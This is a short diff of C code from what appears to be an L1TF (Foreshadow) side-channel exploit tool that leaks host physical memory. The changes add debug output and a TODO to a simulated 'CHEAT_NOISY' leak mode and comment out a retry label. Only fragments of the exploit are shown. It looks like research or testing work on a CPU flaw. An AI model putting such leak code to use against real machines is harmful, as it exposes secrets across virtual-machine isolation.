@@ -260,7 +260,7 @@ void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, cons
   size_t start = (phys_addr & 0xfff);
   assert(start + length <= 0x1000);
 
-retry:
+// retry:
   for (int x = 0; x < 5000; ++x) {
     for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
       void *leak_addr = (char *)leak.leak + j;
@@ -1166,6 +1166,7 @@ int confidently_cached(hpa_t pa, u64 len)
 
 void l1tf_leak_cheat_wrapper(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
 {
+  const int verbose = 0;
 #if LEAK == CHEAT || LEAK == CHEAT_NOISY
     u64 *buf = malloc(len + 8);
     for (u64 off = 0; off < len; off += 8)
@@ -1173,9 +1174,14 @@ void l1tf_leak_cheat_wrapper(char *data, uintptr_t base, uintptr_t pa, uintptr_t
     memcpy(data, buf, len);
     free(buf);
   #if LEAK == CHEAT_NOISY
-    for (u64 i = 0; i < len; i++)
-      if (rdrand() % 1024 < NOISINESS)
-        ((char *)data)[i] = 0;
+    if (verbose) fprintf(stderr, "randomness for %lx +%lx: [", pa, len);
+    for (u64 i = 0; i < len; i++) {
+      u64 r = rdrand() % 1024;
+      if (verbose) fprintf(stderr, "%lx, ", r);
+      if (r < NOISINESS)
+        data[i] = 0;
+    }
+    if (verbose) fprintf(stderr, "]\n");
     static u64 count = 0;
     if (++count == 0x97) {
       count = rdrand() % 9;
@@ -1192,6 +1198,7 @@ void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
   const int verbose = 0;
   if (verbose) fprintf(stderr, "\n");
 
+  // TODO: L1TF-caching causes getting stuck on partially leaked data for CHEAT_NOISY, NOISINESS 500
   int is_cached = confidently_cached(pa, len);
   if (!is_cached)
     l1tf_leak_cheat_wrapper(data, base, pa, len);
